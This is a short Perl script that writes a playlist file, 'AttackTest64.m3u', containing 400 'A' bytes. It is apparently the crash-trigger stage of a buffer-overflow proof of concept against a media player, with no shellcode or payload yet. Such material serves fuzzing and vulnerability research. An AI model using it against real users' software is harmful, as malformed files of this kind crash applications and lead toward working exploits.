my $file = "AttackTest64.m3u";
my $junk = "\x41" x 400;
open($FILE, ">$file");
print $FILE $junk;
close($FILE);
print "m3u File Created Successfully \n";